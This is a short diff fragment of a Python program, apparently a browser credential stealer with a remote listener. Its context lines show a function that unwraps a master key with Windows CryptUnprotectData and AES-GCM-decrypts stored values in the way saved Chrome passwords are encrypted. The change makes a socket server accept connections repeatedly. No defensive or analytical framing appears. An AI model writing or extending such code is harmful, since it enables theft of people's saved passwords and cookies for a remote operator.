@@ -11,8 +11,8 @@ def decrypt(buff, master_key):
         return AES.new(CryptUnprotectData(master_key, None, None, None, 0)[1], AES.MODE_GCM, buff[3:15]).decrypt(buff[15:])[:-16].decode()
     except:
         return "Error"
-conn , addr = socket.accept()
-with conn:
+while True:
+        conn , addr = socket.accept()
         print(f"Connected by {addr}")
         true = 1
         while true == 1:
